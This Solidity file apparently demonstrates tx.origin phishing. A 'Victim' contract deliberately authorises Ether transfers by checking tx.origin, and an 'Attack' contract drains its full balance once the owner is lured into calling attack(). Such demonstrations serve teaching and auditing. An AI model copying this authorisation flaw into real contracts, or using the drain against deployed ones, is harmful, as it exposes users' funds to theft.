// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Victim {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function deposit() external payable {}

    function transfer(address payable _to, uint256 _amount) external payable {
        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    address payable public owner;
    Victim public victim;

    constructor(address _victim) {
        victim = Victim(_victim);
        owner = payable(msg.sender);
    }

    function attack() public {
        victim.transfer(owner, address(victim).balance);
    }
}
